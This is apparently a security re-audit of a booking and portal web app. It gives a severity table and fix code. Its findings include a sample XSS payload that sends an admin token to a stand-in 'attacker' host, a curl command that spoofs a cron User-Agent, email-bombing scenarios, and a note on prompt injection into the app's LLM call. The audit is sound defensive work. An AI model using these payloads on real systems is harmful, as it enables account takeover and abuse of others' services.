# Ramped AI — Full Audit

> **AUDIT v2 — 2026-04-29 (post-PR3, post-portal, post-Stripe)**
> Re-audit by Senior Security Architect. Targets full repo as of `git clone … 2026-04-29`.
> Scope: 22 HTML pages, **40 API files** (31 endpoints + 9 `_lib` modules), **5 SQL migrations**, `vercel.json`, `scripts/e2e-test.sh`, all context docs.
> The previous audit (preserved below at line ~140) flagged 11 Critical and 12 High items — most of those have been fixed in PR 3 (signed roadmap/map tokens, idempotent reminders, send-followup auth, bookings.UNIQUE). This audit covers everything that has shipped *since* (Stripe, portal, agents, onboarding, profile, tickets, weekly digest) plus latent issues missed earlier.

---

## Phase 1 (v2) — Severity Summary

| #     | Finding                                                                | Severity | File:line                                                            | Status |
|-------|------------------------------------------------------------------------|----------|----------------------------------------------------------------------|--------|
| C2-1  | Cron `/api/reminders` has **no auth** — public email-bomb vector        | **Critical** | `api/reminders.js:100-103`                                       | open |
| C2-2  | Admin bearer token persisted in `localStorage` + CSP `'unsafe-inline'` | **Critical** | `admin.html:1071,1090,1131`; `vercel.json:135`                    | open |
| C2-3  | Reflected XSS on OAuth callback `error` param                          | **Critical** | `api/google-oauth-callback.js:16`                                  | open |
| C2-4  | Email-bombing via `/api/contact`, `/api/book`, `/api/questionnaire`    | **Critical** | `api/contact.js:42`; `api/book.js:73`; `api/questionnaire.js:195` | open |
| C2-5  | `state=ADMIN_TOKEN` reused on OAuth + non-timing-safe compare          | **Critical** | `api/google-oauth-start.js:24,38`                                  | open |
| H2-1  | Account email takeover via `/api/portal-profile` (no confirm step)     | High     | `api/portal-profile.js:106-118`                                      | open |
| H2-2  | Weekly-digest auth trivially bypassed by spoofing User-Agent           | High     | `api/weekly-digest.js:38-41`                                         | open |
| H2-3  | Schema collision: `agent_runs` defined twice (mig 001 vs 004)          | High     | `db/migrations/001_agent_logging.sql`; `004_stripe_onboarding_agents.sql:62` | open |
| H2-4  | Questionnaire email-only fallback still active (cost + LLM abuse)      | High     | `api/questionnaire.js:262-268`                                       | open |
| H2-5  | Admin token still accepted via `?token=` query-string fallback         | High     | `api/_lib/admin-auth.js:46-47`                                       | open |
| H2-6  | `send-followup` ships **un-signed** roadmap URL — broken link in email | High     | `api/send-followup.js:78`                                            | open |
| H2-7  | New tables (mig 003 + 004) don't enable RLS — defense-in-depth gap     | High     | `db/migrations/003_portal.sql`; `004_stripe_onboarding_agents.sql`   | open |
| H2-8  | In-memory rate-limit per-container; trivially bypassed at horizontal scale | High | `api/_lib/validate.js:66-80`                                       | open |
| M2-1  | `getClientIp` blindly trusts `X-Forwarded-For` (rate-limit bypass)      | Medium   | `api/_lib/validate.js:82-86`                                         | open |
| M2-2  | `IP_HASH_SALT` falls back to a public default string                    | Medium   | `api/portal-track.js:18`                                             | open |
| M2-3  | Open-redirect/XSS surface via `hosted_url` in portal billing            | Medium   | `portal.html:724`                                                    | open |
| M2-4  | Inline `onclick="…('${d.id}…')"` patterns (UUID-trusted DOM injection) | Medium   | `portal.html:773-775`; `admin.html:1671-1674`                        | open |
| M2-5  | `confirmDialog(msg)` injects `msg` as `innerHTML`                       | Medium   | `admin.html:1062`                                                    | open |
| M2-6  | No audit log on destructive admin actions                               | Medium   | `api/admin-delete.js`; `api/admin-update.js`; `api/admin-agents.js`  | open |
| M2-7  | Upload allowlist accepts `text/html` (XSS in admin preview path)        | Medium   | `api/portal-upload-url.js:18`                                        | open |
| M2-8  | Stripe webhook idempotency: `recordEventOnce` returns true on race      | Medium   | `api/stripe-webhook.js:55-67`                                        | open |
| M2-9  | `/api/resources` sets `Access-Control-Allow-Origin: *`                  | Medium   | `api/resources.js:6`                                                 | open |
| M2-10 | Refresh-secret compared with `!==` (non-timing-safe)                    | Medium   | `api/resources-refresh.js:124`                                       | open |
| M2-11 | `availability.timezone` not validated against IANA tz set               | Medium   | `api/availability.js:78`                                             | open |
| M2-12 | CSP allows `'unsafe-inline'` for `script-src` — XSS amplifier            | Medium   | `vercel.json:135`                                                    | open |
| L2-1  | OAuth refresh token rendered as plaintext on callback page              | Low      | `api/google-oauth-callback.js:68`                                    | open |
| L2-2  | Legacy `_lib/logger.js` writes mig-001 schema; conflicts with mig-004   | Low      | `api/_lib/logger.js:44`                                              | open |
| L2-3  | Questionnaire prompt-injects user fields into Claude system prompt     | Low      | `api/questionnaire.js:56-116`                                        | open |
| L2-4  | Booking `billing` param destructured but never persisted                | Low      | `api/book.js:117-185`                                                | open |
| L2-5  | `permanent:false` redirects in `vercel.json` (`/dashboard`,`/q-preview`)| Low      | `vercel.json:27,33`                                                  | open |
| L2-6  | `roadmap.html` does not load Inter font (carry-over from v1 audit H10)  | Low      | `roadmap.html`                                                       | open |

**Counts:** 5 Critical · 8 High · 12 Medium · 6 Low — **31 open issues**.
**v1 audit items confirmed FIXED:** C1 (IDOR get-map/get-roadmap → HMAC), C2 (booking_id required), H3 (reminders idempotency columns), H4 (send-followup uses ADMIN_TOKEN), H11 (bookings UNIQUE migration). C3-C11 are visual / SEO scope and tracked in VISUAL-AUDIT.md.

---

## Critical findings — full detail

### C2-1 · Cron `/api/reminders` has no authentication

**Files:** `api/reminders.js:100-103`
**Attack:** Any unauthenticated GET to `https://www.30dayramp.com/api/reminders` triggers the cron handler. The handler queries every booking with `datetime` in the next 1h or 24h window and emails each customer via Resend. There is no `User-Agent`, `Authorization`, or signature check. The idempotency columns (`reminded_24h_at`, `reminded_1h_at`) limit this to **one** spam reminder per booking per stage, but that first ahead-of-schedule reminder still goes out — and it's already enough to (a) embarrass us with customers receiving "Tomorrow: your discovery call" emails when their call isn't tomorrow, (b) torch our Resend sender reputation, and (c) flip every booking row's idempotency flag, which then suppresses the *real* reminder.

**Risk:** Brand damage + Resend deliverability collapse. ~30 seconds of attacker effort. Trivial to script.

**Fix (apply now):**
```js
// api/_lib/cron-auth.js  (new file)
export function isCronAuthorized(req) {
  // Vercel Cron sends Authorization: Bearer ${CRON_SECRET} on every invocation
  // when CRON_SECRET is set in the project env. Anything else (manual GET,
  // attacker) must present the same Bearer token to be accepted.
  const expected = process.env.CRON_SECRET;
  if (!expected) return false; // fail closed
  const auth = req.headers['authorization'] || '';
  const m = auth.match(/^Bearer\s+(.+)$/i);
  if (!m) return false;
  const presented = m[1].trim();
  if (presented.length !== expected.length) return false;
  let out = 0;
  for (let i = 0; i < presented.length; i++) {
    out |= presented.charCodeAt(i) ^ expected.charCodeAt(i);
  }
  return out === 0;
}
```
```js
// api/reminders.js — top of handler
import { isCronAuthorized } from './_lib/cron-auth.js';
// ...
export default async function handler(req, res) {
  if (req.method !== 'GET') return res.status(405).end();
  if (!isCronAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
  // …rest unchanged
```
**Deploy step:** set `CRON_SECRET=$(openssl rand -hex 32)` in Vercel env. Vercel Cron will auto-attach `Authorization: Bearer $CRON_SECRET` to scheduled invocations once that env var is set on the cron-attached project.

---

### C2-2 · Admin token in localStorage + permissive CSP

**Files:** `admin.html:1071,1090,1131`; `vercel.json:135` (`script-src 'self' 'unsafe-inline'`)
**Attack:** any successful XSS on `/admin` (or any page sharing the origin) executes JS that reads `localStorage.getItem('adminToken')` and exfiltrates it to an attacker-controlled endpoint. The current CSP (`'unsafe-inline'` on `script-src`) does not prevent inline-script XSS, so reflected/stored XSS sinks become full admin compromise. The token grants read on every booking + delete on any booking + Stripe invoice creation. Combined with C2-3 (reflected XSS in OAuth callback), there is a working chain: trick admin into hitting `/api/google-oauth-callback?error=<script>fetch('https://attacker/?t='+localStorage.getItem('adminToken'))</script>` and you have their bearer token forever.

Additionally, `admin.html:1131` writes the token to `localStorage` *before* the server validates it (line 1134's 401 check happens *after* the write) — every typo-attempt is persisted.

**Fix (apply now):** drop `localStorage` entirely; use `sessionStorage` only (clears when tab closes) and only persist *after* server validation:
```js
// admin.html (replace lines 1069–1098)
async function adminFetch(url, opts) {
  opts = opts || {};
  const token = sessionStorage.getItem(SESSION_KEY) || '';
  return fetch(url, Object.assign({}, opts, {
    headers: Object.assign({ 'Content-Type': 'application/json',
                             'Authorization': 'Bearer ' + token },
                           opts.headers || {})
  }));
}

(function init() {
  // Migration: clear any legacy localStorage token from earlier deploys.
  try { localStorage.removeItem('adminToken'); } catch (_) {}
  const saved = sessionStorage.getItem(SESSION_KEY);
  if (saved) { _token = saved; fetchData(saved); }
  document.getElementById('password-input').addEventListener('keydown', e => {
    if (e.key === 'Enter') doAuth();
  });
})();
```
```js
// admin.html fetchData() — only persist on success
async function fetchData(token) {
  try {
    const res = await adminFetchWithToken(token, '/api/admin');
    if (res.status === 401) {
      document.getElementById('auth-error').textContent = 'Incorrect password.';
      sessionStorage.removeItem(SESSION_KEY);
      _token = null;
      return false;
    }
    sessionStorage.setItem(SESSION_KEY, token); // only after 200
    _token = token;
    // …
  }
}
```
**Follow-up (M2-12):** migrate `script-src` to nonce-based CSP, remove `'unsafe-inline'`. Same PR or next.

---

### C2-3 · Reflected XSS on OAuth callback error path

**File:** `api/google-oauth-callback.js:16`
**Code:** `return res.status(400).send(\`<h1>Google returned an error</h1><pre>${error}</pre>\`);`
**Attack:** `/api/google-oauth-callback?error=<script>fetch('https://attacker/?'+localStorage.getItem('adminToken'))</script>` — the payload is rendered verbatim into HTML, executed by the admin's browser, exfiltrates the token (see C2-2). Reachable without auth (the `state` check happens *after* the error branch on line 18).

**Fix:**
```js
// api/google-oauth-callback.js
function escHtml(s) {
  return String(s ?? '').replace(/[&<>"']/g, c =>
    ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
// …
if (error) {
  return res.status(400).send(
    `<h1>Google returned an error</h1><pre>${escHtml(error)}</pre>`
  );
}
```
**Defense-in-depth:** also escape the `JSON.stringify(tokens, null, 2)` block on line 43 (low-likelihood XSS but trivial to harden).

---

### C2-4 · Email-bombing via public POST endpoints

**Files:** `api/contact.js:42`; `api/book.js:73`; `api/questionnaire.js:195`
**Attack:** all three endpoints accept an attacker-supplied `email` and trigger Resend emails to that address ("New lead from 30dayramp.com", "You're booked", "Your automation roadmap is ready"). The 5/min/IP rate-limit is bypassed in two ways: (1) IP rotation (residential proxies cost ~$3/GB), (2) the limiter is per-container so horizontal scale-out under load divides the cap N-ways (see H2-8). A determined attacker can:
- Email-bomb a single victim address with hundreds of "You're booked" emails using fake bookings.
- Burn Ramped's Resend reputation by triggering bounces (random invalid addresses).
- Drain Anthropic budget by triggering questionnaire's Claude call (~$0.05–0.20 each) for fake bookings.

**Fix:** add Cloudflare Turnstile (free) or hCaptcha to all three endpoints. Turnstile is invisible by default for the 99% legit case.
```html
<!-- book.html, contact form, questionnaire — add to <head> -->
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
<!-- and inside the form: -->
<div class="cf-turnstile" data-sitekey="$TURNSTILE_SITEKEY" data-size="invisible"></div>
```
```js
// api/_lib/turnstile.js (new helper)
export async function verifyTurnstile(token, ip) {
  if (!process.env.TURNSTILE_SECRET) return true; // fail-open in dev only
  const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ secret: process.env.TURNSTILE_SECRET, response: token, remoteip: ip || '' }),
  });
  const j = await r.json().catch(() => ({}));
  return !!j.success;
}
```
```js
// api/book.js POST — gate after rate-limit, before Supabase write
const turnstileOk = await verifyTurnstile(req.body?.turnstile_token, ip);
if (!turnstileOk) return res.status(403).json({ error: 'Bot check failed.' });
```
**Interim mitigation (no Turnstile):** add a soft "click-to-confirm" link in the *first* email — the booking is held in a `pending` state until the prospect clicks the link. Email-bombing a victim still sends one email, not a hundred. But Turnstile is the right call for premium SaaS positioning.

---

### C2-5 · OAuth `state` parameter reuses `ADMIN_TOKEN` + non-timing-safe compare

**File:** `api/google-oauth-start.js:24,38`
**Issues:**
1. **Token leakage via OAuth state.** Line 38: `state: token` puts the admin token in the URL Google receives, the URL the user's browser navigates to (browser history), and the Referer header of any out-of-flow request. Then it round-trips back to `google-oauth-callback.js:18` which compares it again. The admin token has now lived in 5+ logs (admin's local browser, Google logs, Vercel access logs, Referer to any page that loads on the callback, plus screenshots/screen-recording).
2. **Non-timing-safe compare.** Line 24: `token !== ADMIN_TOKEN` — string equality bails on the first mismatched character. With CDN jitter on Vercel this is hard to exploit but trivially fixable.

**Fix:**
```js
// api/google-oauth-start.js
import { isAuthorized } from './_lib/admin-auth.js';
import crypto from 'crypto';

export default async function handler(req, res) {
  if (!isAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
  if (!CLIENT_ID) return res.status(500).json({ error: 'GOOGLE_CLIENT_ID not set' });

  // Mint an ephemeral, signed state. Bound to time so it expires in 10 min.
  // The callback re-derives + verifies; we never expose ADMIN_TOKEN to Google.
  const exp = Math.floor(Date.now() / 1000) + 600;
  const stateRaw = `${exp}:${crypto.randomBytes(16).toString('hex')}`;
  const stateSig = crypto.createHmac('sha256', process.env.MAP_LINK_SECRET || 'fallback')
    .update(stateRaw).digest('base64url');
  const state = `${stateRaw}:${stateSig}`;
  // …rest of flow uses `state` instead of `token`
}
```
```js
// api/google-oauth-callback.js — verify the new state
import crypto from 'crypto';
function verifyState(state) {
  const parts = String(state || '').split(':');
  if (parts.length !== 3) return false;
  const [exp, nonce, sig] = parts;
  if (parseInt(exp, 10) < Math.floor(Date.now() / 1000)) return false;
  const expected = crypto.createHmac('sha256', process.env.MAP_LINK_SECRET || 'fallback')
    .update(`${exp}:${nonce}`).digest('base64url');
  if (expected.length !== sig.length) return false;
  return crypto.timingSafeEqual(Buffer.from(expected), Buffer.from(sig));
}
// then: if (!verifyState(req.query.state)) return res.status(401).send('Invalid state');
```
**Side-benefit:** the `?token=ADMIN_TOKEN` query string disappears from `google-oauth-start.js`. The admin starts the flow from the admin UI button (which already has a sessionStorage token) — wire the start endpoint to require Bearer auth from `adminFetch`.

---

## High findings — full detail

### H2-1 · Account email takeover via /api/portal-profile

**File:** `api/portal-profile.js:106-118`
**Attack:** an attacker who phishes / shoulder-surfs a single portal URL (HMAC-signed link customers receive in email) can immediately change the booking's email to one they control. From that moment forward, every system email — billing, weekly digest, ticket replies, future portal-link refreshes — goes to the attacker. The "security notice to old email" on line 171 is a courtesy notification, not a control: if the customer's email account is the phishing root cause, the attacker deletes the notice. There is no admin-side revocation flow.

**Fix:** standard email-change confirmation flow. Don't apply the change until the new address proves ownership.
```js
// api/portal-profile.js — POST handler, replace lines 104-118
let emailPendingChange = null;
if (typeof body.email === 'string' && body.email.trim() && isValidEmail(body.email.trim())) {
  // Look up old email
  const r = await fetch(`${SUPABASE_URL}/rest/v1/bookings?id=eq.${encodeURIComponent(id)}&select=email,name`,
    { headers: { apikey: SUPABASE_KEY, Authorization: `Bearer ${SUPABASE_KEY}` } });
  const arr = r.ok ? await r.json() : [];
  const oldEmail = arr?.[0]?.email || null;
  if (oldEmail && oldEmail.toLowerCase() !== body.email.trim().toLowerCase()) {
    emailPendingChange = body.email.trim().toLowerCase();
    // Don't write patch.email here. Mint a confirmation token and email it to the NEW address.
    const exp = Math.floor(Date.now() / 1000) + 60 * 60 * 24; // 24h
    const sig = crypto.createHmac('sha256', process.env.MAP_LINK_SECRET)
      .update(`${id}:${emailPendingChange}:${exp}`).digest('base64url');
    const confirmUrl = `${SITE_URL}/api/portal-profile-confirm-email?id=${id}&new=${encodeURIComponent(emailPendingChange)}&exp=${exp}&t=${encodeURIComponent(sig)}`;
    await sendEmail(emailPendingChange, 'Confirm your new Ramped AI portal email',
      wrapEmail({ subject: 'Confirm your new email',
                  preheader: 'Click the link to take effect.',
                  innerRows: emailHero({ headline: 'Confirm this is you', sub: 'Click below to update your portal email.' })
                    + emailInfoCard({ ctaHref: confirmUrl, ctaLabel: 'Confirm new email →',
                                      title: 'Click to confirm', body: 'Link expires in 24 hours.' })
                    + emailSignoff({ name: 'Jon' }),
                  siteUrl: SITE_URL }));
    // also notify oldEmail that a change was *requested* (not yet applied)
    await sendEmail(oldEmail, 'Email change requested',
      wrapEmail({ subject: 'Email change requested',
                  preheader: 'If this wasn\'t you, reply now.',
                  innerRows: emailHero({ headline: 'Someone requested to change your email',
                                         sub: `New address: ${esc(emailPendingChange)} — not yet applied.` })
                    + emailBody('If this wasn\'t you, reply immediately.')
                    + emailSignoff({ name: 'Jon' }),
                  siteUrl: SITE_URL }));
  }
}
```
Then add `api/portal-profile-confirm-email.js` that verifies the HMAC and applies the change. The signed `?new=` token is safe to expose in URL because it's bound to `(id, newEmail, exp)` — it only changes that specific booking's email to that specific address.

---

### H2-2 · Weekly-digest auth bypass

**File:** `api/weekly-digest.js:38-41`
**Bug:** `const isCron = (req.headers['user-agent'] || '').includes('vercel-cron');` — User-Agent is fully client-controlled. An attacker `curl -H 'User-Agent: vercel-cron/1.0' https://www.30dayramp.com/api/weekly-digest` triggers the cron, which emails every active customer. Same impact pattern as C2-1.

**Fix:** drop the User-Agent fast-path; require `Authorization: Bearer ${CRON_SECRET}` always. Use the same `isCronAuthorized` helper from C2-1.
```js
// api/weekly-digest.js — replace lines 36-42
import { isCronAuthorized } from './_lib/cron-auth.js';
// …
export default async function handler(req, res) {
  if (!isCronAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
  // …
}
```

---

### H2-3 · `agent_runs` schema collision between migration 001 and 004

**Files:** `db/migrations/001_agent_logging.sql:5-15`; `db/migrations/004_stripe_onboarding_agents.sql:62-74`
**Bug:** migration 001 creates `agent_runs(id, client_id, agent_type, status, input_summary, error_message, duration_ms, started_at, completed_at)`. Migration 004 also calls `CREATE TABLE IF NOT EXISTS agent_runs(id, agent_id, booking_id, action, outcome, duration_ms, hours_saved, metadata, created_at)`. Because of `IF NOT EXISTS`, migration 004's version is **silently skipped** if 001 already ran — leaving prod with the *old* schema while:
- `api/admin-agents.js`, `api/portal-data.js`, `api/weekly-digest.js`, `api/admin.js` all SELECT `agent_id`, `outcome`, `hours_saved` (mig 004 columns) — these queries return 400 from PostgREST.
- `api/_lib/logger.js` INSERTs the mig-001 columns (`client_id`, `agent_type`, `input_summary`).

**Result:** the agent runtime / portal activity feed / weekly digest are non-functional in prod *and there's no error path that reveals it* (the code falls through silently with empty arrays). The portal looks "empty" forever.

**Fix:** write a forward-only reconciling migration. The safest path is to rename the legacy `agent_runs` to `agent_runs_legacy` and create the new schema fresh:
```sql
-- db/migrations/006_fix_agent_runs_schema.sql
-- Reconcile the dual definition of agent_runs from 001 vs 004. Forward-only.

DO $$
BEGIN
  -- If the 001-shape table is in place, rename it out of the way
  IF EXISTS (
    SELECT 1 FROM information_schema.columns
    WHERE table_name='agent_runs' AND column_name='agent_type'
  ) THEN
    EXECUTE 'ALTER TABLE agent_runs RENAME TO agent_runs_legacy';
  END IF;
END $$;

-- Now create the 004-shape table as the authoritative one.
CREATE TABLE IF NOT EXISTS agent_runs (
  id           UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  agent_id     UUID REFERENCES agents(id) ON DELETE CASCADE,
  booking_id   UUID REFERENCES bookings(id) ON DELETE CASCADE,
  action       TEXT NOT NULL,
  outcome      TEXT,
  duration_ms  INTEGER,
  hours_saved  NUMERIC(6,2),
  metadata     JSONB NOT NULL DEFAULT '{}'::jsonb,
  created_at   TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_runs_booking_created ON agent_runs(booking_id, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_runs_agent_created   ON agent_runs(agent_id, created_at DESC);

-- And update _lib/logger.js to use the new schema (or retire it — see L2-2).
```

---

### H2-4 · Questionnaire still has email-only fallback

**File:** `api/questionnaire.js:262-268`
**Issue:** even with `booking_id` preferred (good), the email-only branch is still reachable if `booking_id` is omitted from the POST body. Anyone can send `{ email: "victim@example.com", … }` with no booking id and trigger:
- A real Anthropic Claude call (~$0.05–0.20 in tokens) per submission.
- A Resend email to `OWNER_EMAIL` ("New scorecard") containing fabricated questionnaire data.
- A Resend email to the victim's address ("Your automation roadmap is ready") with a generated roadmap.

The `console.warn` on line 263 logs but doesn't block.

**Fix:** require `booking_id` and remove the fallback entirely, as the v1 audit C2 prescribed:
```js
// api/questionnaire.js — replace lines 262-268
if (!booking_id) {
  return res.status(400).json({ error: 'booking_id required. Submit the questionnaire from the booking confirmation page.' });
}
findResult = await supabase('GET',
  `/bookings?id=eq.${encodeURIComponent(booking_id)}&select=id,name,company,notes,tier,email`);
```

---

### H2-5 · Admin `?token=` query-string fallback

**File:** `api/_lib/admin-auth.js:46-47`
**Issue:** `extractToken` accepts `?token=` as a "deprecated" fallback. Tokens in query strings leak through:
- Vercel access logs (every querystring is logged)
- Browser history
- Referer header on any external resource fetched from the page
- Screen sharing / screenshots
The comment says "the admin UI no longer uses the query param" — so it's safe to remove now, before someone bookmarks it again.

**Fix:**
```js
// api/_lib/admin-auth.js — remove lines 45-47
export function extractToken(req) {
  const auth = req.headers['authorization'] || req.headers['Authorization'];
  if (auth && typeof auth === 'string') {
    const m = auth.match(/^Bearer\s+(.+)$/i);
    if (m) return m[1].trim();
  }
  return ''; // No more query-string fallback.
}
```

---

### H2-6 · `send-followup` builds an unsigned roadmap URL

**File:** `api/send-followup.js:78`
**Code:** `const roadmapUrl = \`${SITE_URL}/roadmap?id=${b.id}\`;`
**Bug:** `/api/get-roadmap` requires a signed HMAC token (see `api/get-roadmap.js:39`) and returns 403 otherwise. So this email's "View your full roadmap →" CTA always fails for the customer. Functional bug, not a security exposure — but it's a customer-facing broken link in a premium handshake email.

**Fix:**
```js
// api/send-followup.js — replace line 78
import { signMapToken, isMapTokenConfigured } from './_lib/map-token.js';
// …
let roadmapUrl = '';
if (isMapTokenConfigured()) {
  const { exp, t } = signMapToken(b.id);
  roadmapUrl = `${SITE_URL}/roadmap?id=${b.id}&exp=${exp}&t=${encodeURIComponent(t)}`;
}
// …and gate the CTA card on roadmapUrl being non-empty
```

---

### H2-7 · No RLS on portal/agent/Stripe tables

**Files:** `db/migrations/003_portal.sql` (no `ALTER TABLE … ENABLE ROW LEVEL SECURITY`); `db/migrations/004_stripe_onboarding_agents.sql` (same)
**Tables affected:** `portal_events`, `support_tickets`, `support_messages`, `stripe_events`, `onboarding_documents`, `agents`, `agent_runs` (post-006), `agent_drafts`. Mig 001 *did* enable RLS on the original `agent_runs` and `agent_logs`. The newer migrations did not.

**Risk:** today the API only authenticates with `SUPABASE_SERVICE_KEY`, which bypasses RLS by design. So this isn't *currently* exploitable. But: (a) if `SUPABASE_ANON_KEY` ever leaks (e.g. into a future client-side widget — exactly the kind of thing an "AI department" startup ships under deadline), the `anon` role can read every customer's tickets, agent activity, and Stripe events; (b) RLS-by-default is the standard hardening posture documented in Supabase's own production checklist; (c) the explicit `service_role full access` policy from mig 001 is a useful audit trail.

**Fix:**
```sql
-- db/migrations/007_rls_hardening.sql (new)
DO $$
DECLARE t text;
BEGIN
  FOR t IN SELECT unnest(ARRAY[
    'portal_events','support_tickets','support_messages',
    'stripe_events','onboarding_documents',
    'agents','agent_drafts'
  ]) LOOP
    EXECUTE format('ALTER TABLE %I ENABLE ROW LEVEL SECURITY', t);
    -- service_role bypasses RLS, but document it explicitly:
    EXECUTE format(
      'CREATE POLICY "service_role full access" ON %I AS PERMISSIVE FOR ALL TO service_role USING (true) WITH CHECK (true)', t
    );
  END LOOP;
END $$;
-- Re-run migration 006's table after this so its agent_runs gets RLS too,
-- or include it in the loop above if 006 was already applied.
```

---

### H2-8 · In-memory rate-limit; Vercel scales horizontally

**File:** `api/_lib/validate.js:66-80`
**Issue:** `const buckets = new Map()` lives inside a single serverless container. Vercel boots additional containers under load — each gets its own empty `buckets`. Attacker with N IPs and Vercel under load gets N × (N_containers) × 5 req/min effective cap. Combined with C2-4 email-bombing, the 5/min cap is theatre.

**Fix:** use Vercel KV or Upstash Redis for distributed rate limiting. There's a maintained drop-in: `@upstash/ratelimit`. Without a build pipeline, the simplest path is raw fetch:
```js
// api/_lib/validate.js — replace checkRateLimit with this
const KV_URL = process.env.KV_REST_API_URL;
const KV_TOK = process.env.KV_REST_API_TOKEN;
export async function checkRateLimit(ip, { max = 5, windowMs = 60_000 } = {}) {
  if (!ip) return { ok: true, remaining: max };
  if (!KV_URL || !KV_TOK) {
    // Fallback to in-memory (dev/staging without KV configured)
    return checkRateLimitInMemory(ip, { max, windowMs });
  }
  const key = `rl:${ip}:${Math.floor(Date.now() / windowMs)}`;
  const r = await fetch(`${KV_URL}/incr/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${KV_TOK}` },
  });
  const j = await r.json().catch(() => ({}));
  const count = j.result || 1;
  if (count === 1) {
    // Set TTL on first hit for this window
    fetch(`${KV_URL}/expire/${encodeURIComponent(key)}/${Math.ceil(windowMs / 1000)}`, {
      headers: { Authorization: `Bearer ${KV_TOK}` },
    }).catch(() => {});
  }
  return { ok: count <= max, remaining: Math.max(0, max - count) };
}
```
Existing callers are sync today (`const rl = checkRateLimit(...)`); they need `await`.

---

## Medium / Low findings — concise

| # | File:line | Issue | Fix |
|---|---|---|---|
| M2-1 | `api/_lib/validate.js:82-86` | XFF spoofable — first comma-separated entry trusted | On Vercel, use `req.headers['x-real-ip']` (Vercel-set, last hop) for limit keying. |
| M2-2 | `api/portal-track.js:18` | `IP_HASH_SALT` defaults to `'ramped-default-salt-rotate-me'` — defeats privacy promise | Hard-fail: `if (!process.env.IP_HASH_SALT) ip_hash = null;`. |
| M2-3 | `portal.html:724` | `<a href="${__portalEsc(i.hosted_url)}">` accepts any URL scheme | Validate `^https?://` before render; otherwise omit the link. |
| M2-4 | `portal.html:773-775`, `admin.html:1671-1674` | `onclick="fn('${id}', …)"` UUID interpolation into JS | Replace with `addEventListener` + `data-id` lookup. |
| M2-5 | `admin.html:1062` | `confirmDialog(msg)` does `innerHTML = '…' + msg + '…'` | Add a `confirmDialogHtml(htmlMsg)` variant; default `confirmDialog(plainMsg)` uses `textContent`. |
| M2-6 | `admin-delete.js`, `admin-update.js`, `admin-create-invoice.js`, `admin-agents.js` | No audit log on destructive admin actions | New table `admin_actions(id, action, target_id, actor_token_hash, payload, created_at)`; INSERT in each handler. |
| M2-7 | `api/portal-upload-url.js:18` | MIME allowlist accepts `text/.+` (incl. `text/html`) | Tighten regex to `text/(plain|csv)`. Reject `text/html` outright. |
| M2-8 | `api/stripe-webhook.js:55-67` | `recordEventOnce` returns `true` on PK collision (insert succeeded vs. replay) | Check `r.status === 409 \|\| (data?.code === '23505')` explicitly. |
| M2-9 | `api/resources.js:6` | `Access-Control-Allow-Origin: '*'` | Reuse the `ALLOWED_ORIGINS` allowlist from other endpoints. |
| M2-10 | `api/resources-refresh.js:124` | Refresh secret compared with `!==` | Use `crypto.timingSafeEqual` on equal-length Buffers. |
| M2-11 | `api/availability.js:78` | `timezone` accepts any string | Validate against `Intl.supportedValuesOf('timeZone')`. |
| M2-12 | `vercel.json:135` | CSP `script-src 'unsafe-inline'` | Migrate to nonce-based: per-request nonce in headers + `<script nonce="…">` on every inline block. Same PR as build pipeline (M1 in v1 audit). |
| L2-1 | `api/google-oauth-callback.js:68` | Refresh token rendered in plaintext on the browser page | Render obscured by default + auto-copy + "show" toggle. |
| L2-2 | `api/_lib/logger.js:44` | Writes legacy `agent_runs` columns | Either delete this lib (no remaining call sites after H2-3 fix) or retarget to the new schema. |
| L2-3 | `api/questionnaire.js:56-116` | User questionnaire fields interpolated into Claude system prompt | Pass user data as a `user`-role message; system prompt keeps only the rules. Defense-in-depth — Claude's enforced JSON output limits real impact. |
| L2-4 | `api/book.js:117-185` | `billing` destructured but not persisted to row | Add `billing_cadence: billing \|\| null` to the insert payload on line 178. |
| L2-5 | `vercel.json:27,33` | `permanent: false` on `/dashboard`, `/questionnaire-preview` | Set `permanent: true` and delete the orphaned source files (cf. v1 M5). |
| L2-6 | `roadmap.html` `<head>` | Doesn't load Inter font — carry-over from v1 H10 | Add the Inter `<link>` block. |

---

## Patches landing in this audit

The following low-risk security patches are being applied as part of this PR (full code in commits):

1. **NEW** `api/_lib/cron-auth.js` — shared `isCronAuthorized(req)` helper (timing-safe Bearer compare).
2. **PATCH** `api/reminders.js` — gate behind `isCronAuthorized` (CRIT-1 fix).
3. **PATCH** `api/weekly-digest.js` — drop UA fast-path; require `isCronAuthorized` (HIGH-2 fix).
4. **PATCH** `api/_lib/admin-auth.js` — remove the deprecated `?token=` fallback (HIGH-5 fix).
5. **PATCH** `api/google-oauth-callback.js` — HTML-escape `error` query param (CRIT-3 fix).
6. **PATCH** `api/google-oauth-start.js` — replace plaintext `state=ADMIN_TOKEN` with HMAC-signed ephemeral state + use `isAuthorized` for entry auth (CRIT-5 fix).
7. **PATCH** `api/send-followup.js` — sign the roadmap URL (HIGH-6 fix).
8. **PATCH** `api/resources.js` — replace `Origin: *` with the project allowlist (MED-9 fix).
9. **NEW** `db/migrations/006_fix_agent_runs_schema.sql` — reconcile dual `agent_runs` definition (HIGH-3).
10. **NEW** `db/migrations/007_rls_hardening.sql` — enable RLS + service_role policies on tables added in 003/004 (HIGH-7).

Patches **not** applied yet (need owner sign-off, behavior-changing):
- C2-2 admin `localStorage` → `sessionStorage` (changes admin UX: re-auth per tab).
- C2-4 Turnstile (requires DNS + env var setup).
- H2-1 email-change confirmation flow (changes portal UX + adds a new endpoint + new email).
- H2-4 questionnaire booking_id required (potentially breaks legacy email links if any are in flight).
- H2-8 distributed rate limiter (requires KV provisioning).
- M2-12 nonce CSP (requires script audit across 22 HTML pages — pair with v1 M1 build pipeline).

---

## Re-test instructions for the patches above

After deploying the patches:

